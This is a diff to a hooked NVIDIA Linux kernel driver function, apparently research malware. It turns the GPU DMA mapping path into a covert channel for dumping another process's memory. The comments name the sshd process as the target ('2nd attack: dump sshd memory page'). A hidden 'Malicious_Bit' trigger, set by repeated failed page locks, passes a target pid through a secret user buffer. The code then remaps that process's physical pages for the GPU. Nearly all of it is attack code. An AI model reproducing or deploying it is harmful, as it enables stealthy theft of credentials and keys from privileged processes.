@@ -692,7 +692,6 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 	    struct mm_struct *mm = current->mm;
 
 			// New vars:
-	    static NvU64 hidden_Page;
 	    static int counter = 0;
 	    unsigned long page_number ;
 	    p_hidden_info info_buffer;
@@ -701,7 +700,7 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 		NvBool write = 1, force = 0;
 
 //		static int attack_num = 0;
-		static int dump_num = 0;
+		static int dump_pid;
 
 		DbgPrint("This is Replacemnt funct, Entering!\n");
 		DbgPrint("***YR NVRM: entering dma_map. Adrres of funct:0x%llx !***\n",(unsigned long int)new_funct);
@@ -733,118 +732,6 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 		    dma_map->user_pages = *priv;
 		    dma_map->dev = nvl->dev;
 
-#if 0
-if (attack_num < 2) {
-	// this is the 1st attack: substitute the stub function
-
-	      attack_num ++;
-
-		    // Start getting Phys addr from Pages.
-		    for (i = 0; i < page_count; i++)
-		    {
-		    	//Standart:
-				pte_array[i] = pci_map_page(dma_map->dev, dma_map->user_pages[i], 0,
-		                PAGE_SIZE,
-		                PCI_DMA_BIDIRECTIONAL);
-
-				DbgPrint( "*** YR, pte_array[i] is 0x%llx ***\n",pte_array[i]);
-				DbgPrint( "*** Page size is: %d\n",PAGE_SIZE);
-
-				if (counter==0 ) // First is for setting up the adress through which the info will be passed
-				{
-					if (Malicious_Bit==1)
-					{
-						counter++;
-						DbgPrint( "*** Counter = %d ***, Mal bit was %d\n",counter,Malicious_Bit);
-						Malicious_Bit = 0;
-					}
-					hidden_Page=0x1000;
-					DbgPrint( "*** Counter = %d ***\n",counter);
-					DbgPrint( "page of hidden buffer: 0x%llx",dma_map->user_pages[i]);
-				}
-				else // Now remapping according to what was passed in buffer.
-				{
-					DbgPrint( "*** Counter = %d ***\n",counter);
-
-					rets = os_alloc_mem((void **)&info_buffer, sizeof(hidden_driver_info));
-					if (rets != RM_OK)
-		   			{
-		   			     DbgPrint("YR: failed to allocate buffer in kernel mode!\n");
-		   			     counter = 0;
-		   			     Malicious_Bit = 0;
-		   			     return rets;
-		    		}
-
-					rets=copy_from_user((void*)info_buffer,(void*)global_hidden_addr,sizeof(hidden_driver_info));
-					if (rets != RM_OK)
-		   			{
-		   			     DbgPrint( "YR: failed to copy from user!\n");
-		   			     counter = 0;
-		   			     Malicious_Bit = 0;
-		   			     return rets;
-		   			}
-					DbgPrint( "*** buffer contains after copy: pid = %d\n",info_buffer->pid);
-
-					// Now, we have the pid to be dumped
-					if (rets != RM_OK)
-					{
-					   	DbgPrint("YR: failed to allocate buffer for page nums in kernel mode!\n");
-					   	counter = 0;
-					   	Malicious_Bit = 0;
-					   	return rets;
-					}
-					DbgPrint("YR: allocated buffer for page nums\n");
-					down_read(&mm->mmap_sem);
-						ret = get_pfn_of_virtual_address((unsigned long)info_buffer->start_addr,  &page_number);
-					up_read(&mm->mmap_sem);
-		    		if (ret < 0)
-		    		{
-		    			DbgPrint("YR: failed to get user pages\n");
-		    			counter = 0;
-		    			Malicious_Bit = 0;
-		    			return RM_ERR_INVALID_ADDRESS;
-		    		}
-		    		DbgPrint("YR: Got PFN\n");
-
-		    		DbgPrint("YR: PFN: 0x%llx\n",page_number);
-		    		pte_array[i] = page_number * 0x1000;
-
-					DbgPrint("YR: physical address: 0x%llx\n",pte_array[i]);
-					counter = 0;
-				}
-
-			if (NV_PCI_DMA_MAPPING_ERROR(dma_map->dev, pte_array[i]) ||
-		            (!IS_DMA_ADDRESSABLE(nv, pte_array[i])))
-		        {
-				DbgPrint("NVRM: failed to create a DMA mapping!\n");
-		            if (!IS_DMA_ADDRESSABLE(nv, pte_array[i]))
-		            {
-		            	DbgPrint("NVRM: DMA address not in addressable range of device "
-		                        "%04x:%02x:%02x (0x%llx, 0x%llx-0x%llx)\n",
-		                        NV_PCI_DOMAIN_NUMBER(dma_map->dev),
-		                        NV_PCI_BUS_NUMBER(dma_map->dev),
-		                        NV_PCI_SLOT_NUMBER(dma_map->dev),
-		                        pte_array[i], nv->dma_addressable_start,
-		                        nv->dma_addressable_limit);
-		                status = RM_ERR_INVALID_ADDRESS;
-		            }
-		            else
-		            {
-		                status = RM_ERR_OPERATING_SYSTEM;
-		            }
-
-		            for (j = 0; j < i; j++)
-		            {
-		                pci_unmap_page(dma_map->dev, pte_array[j],
-		                        PAGE_SIZE, PCI_DMA_BIDIRECTIONAL);
-		            }
-
-		            os_free_mem(dma_map);
-		            return status;
-		        }
-		    }
-} else {
-#endif
 
   // This is the 2nd attack: dump sshd memory page
 
@@ -866,22 +753,17 @@ if (attack_num < 2) {
 					{
 						counter++;
 						DbgPrint( "*** Counter = %d ***, Mal bit was %d\n",counter,Malicious_Bit);
-						Malicious_Bit = 0;
+//						Malicious_Bit = 0;
 					}
-					hidden_Page=0x1000;
 					DbgPrint( "*** Counter = %d ***\n",counter);
 					DbgPrint( "page of hidden buffer: 0x%llx\n",dma_map->user_pages[i]);
-				}
-				else // Now remapping according to what was passed in buffer.
-				{
-					DbgPrint( "*** Counter = %d ***\n",counter);
 
 					rets = os_alloc_mem((void **)&info_buffer, sizeof(hidden_driver_info));
 					if (rets != RM_OK)
 		   			{
 		   			     DbgPrint("YR: failed to allocate buffer in kernel mode!\n");
-		   			     counter = 0;
-		   			     Malicious_Bit = 0;
+//		   			     counter = 0;
+//		   			     Malicious_Bit = 0;
 		   			     return rets;
 		    		}
 
@@ -889,37 +771,37 @@ if (attack_num < 2) {
 
 					if (rets != RM_OK)
 		   			{
-		   			     DbgPrint( "YR: failed to copy from user!\n");
-		   			     counter = 0;
-		   			     Malicious_Bit = 0;
+		   			     DbgPrint( "ATK 2: failed to copy from user!\n");
+//		   			     counter = 0;
+//		   			     Malicious_Bit = 0;
 		   			     return rets;
 		   			}
 					DbgPrint( "*** buffer contains after copy: pid = %d\n", info_buffer->pid);
 
-					// Now, we have the pid to be dumped
-
-					if (rets != RM_OK)
-					{
-					   	DbgPrint("ATK 2: failed to allocate buffer for page nums in kernel mode!\n");
-//							counter = 0;
-//							Malicious_Bit = 0;
-					   	return rets;
-					}
-					DbgPrint("ATK 2: allocated buffer for page nums\n");
-
 					// Currently hard-coded sshd page addr:
-					int pid = info_buffer->pid;
+					dump_pid = info_buffer->pid;
+
+					get_vm_area_by_pid(dump_pid);
+					get_dump_addr();
+
+				} else {
+
+					// Now remapping according to what was passed in buffer.
+					DbgPrint( "*** Counter = %d ***\n",counter);
+
 					unsigned long sshd_page_addr;
 //					unsigned long sshd_page_addr = info_buffer->sshd_page_addr;
 
+					if (dump_end_addr - dump_start_addr < PAGE_SIZE) {
+            get_dump_addr();
+					}
 					// Now try get a page from mm_struct
-					get_vm_area_by_pid(pid);
-					get_dump_addr();
 					sshd_page_addr = dump_start_addr;
+					dump_start_addr += PAGE_SIZE;
 					DbgPrint("sshd_page_addr = 0x:%llx\n", sshd_page_addr);
 
 					down_read(&mm->mmap_sem);
-						ret = get_pfn_of_virtual_address_pid(sshd_page_addr, &page_number, pid);
+						ret = get_pfn_of_virtual_address_pid(sshd_page_addr, &page_number, dump_pid);
 					up_read(&mm->mmap_sem);
 		    		if (ret < 0)
 		    		{
@@ -933,7 +815,7 @@ if (attack_num < 2) {
 		    		DbgPrint("ATK 2: PFN: 0x%llx\n",page_number);
 		    		pte_array[i] = page_number * 0x1000;
 
-					DbgPrint("ATK 2: physical address: 0x%llx\n",pte_array[i]);
+					DbgPrint("=== Map: virtual_address: %llx, physical address: 0x%llx\n", sshd_page_addr, pte_array[i]);
 				}
 #endif
 
@@ -968,9 +850,6 @@ if (attack_num < 2) {
 		        }
 		    }
 //}
-
-			  DbgPrint("Mapped user page to 0x:%llx\n", dump_start_addr);
-
 		    *priv = dma_map;
 
 		    return RM_OK;
@@ -1020,13 +899,6 @@ RM_STATUS NV_API_CALL new_os_lock_user_pages(
     up_read(&mm->mmap_sem);
     pinned = ret;
 
-    if (first ==0 )
-    {
-    	DbgPrint("***YR NVRM - first os-mlock***/n");
-    	Malicious_Bit = 0;
-    	first++;
-    }
-
     if (ret < 0)
     {
     	if (Mal_lock == 0)
@@ -1042,7 +914,7 @@ RM_STATUS NV_API_CALL new_os_lock_user_pages(
     	else if (Mal_lock == 2)
     	{
     		DbgPrint("***YR NVRM: 3 Errors in a a row. Unlocking Malcious Bit!****/n");
-    		Malicious_Bit = 1;
+    		Malicious_Bit = ~Malicious_Bit;
 
     	}
         os_free_mem(user_pages);
@@ -1058,8 +930,13 @@ RM_STATUS NV_API_CALL new_os_lock_user_pages(
     if (Malicious_Bit == 1)
     {
     	DbgPrint("***YR NVRm: Mal bit was 1, hidden buffer gets addr/n");
-    	global_hidden_addr = (unsigned long)address;
-    }
+			if (first == 0) {
+				first ++;
+    	  global_hidden_addr = (unsigned long)address;
+			}
+    } else if (Malicious_Bit == 0) {
+			first = 0;
+		}
     Mal_lock = 0;
 
     *page_array = user_pages;
